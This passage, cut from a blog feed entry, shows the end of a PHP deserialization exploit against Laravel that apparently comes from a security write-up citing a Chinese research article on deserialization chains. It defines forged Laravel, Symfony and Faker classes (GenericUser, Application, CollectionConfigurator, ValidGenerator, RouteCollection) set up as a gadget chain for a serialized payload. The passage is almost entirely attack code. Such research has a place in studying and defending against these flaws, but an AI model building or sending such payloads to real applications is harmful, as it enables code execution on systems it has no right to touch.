            $this-&gt;app=$app;
        }
    }
}


namespace Illuminate\Auth{
    class GenericUser{
        protected $attributes;
        public function __construct(array $attributes){
            $this-&gt;attributes = $attributes;
        }
    }
}




namespace Illuminate\Foundation{
    class Application{
        protected $hasBeenBootstrapped = false;
        protected $bindings;


        public function __construct($bind){
            $this-&gt;bindings=$bind;
        }
    }
}


namespace Symfony\Component\Routing\Loader\Configurator{
    class CollectionConfigurator
    {
        public $parent;
        public $collection;
        public $prefixes;


        public function __construct($parent)
{
            $this-&gt;prefixes=1;
            $this-&gt;parent=$parent;
            $this-&gt;collection=new \Symfony\Component\Routing\RouteCollection(array(&quot;12end&quot;=&gt;&quot;12end&quot;));
        }
    }
}


namespace Faker{
    class ValidGenerator
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;


        public function __construct($validator)
{
            $this-&gt;generator = new \Symfony\Component\Routing\RouteCollection(array(&quot;12end&quot;=&gt;&quot;12end&quot;));
            $this-&gt;validator = $validator;
            $this-&gt;maxRetries = 10;
        }
    }
}


namespace Symfony\Component\Routing{
    class RouteCollection{


    }
}
?&gt;
</code></pre>
<h2 id="参考">参考</h2>
<p><a href="https://xz.aliyun.com/t/5483">先知文章-反序列化链1</a></p>
]]></content>
    </entry>
</feed>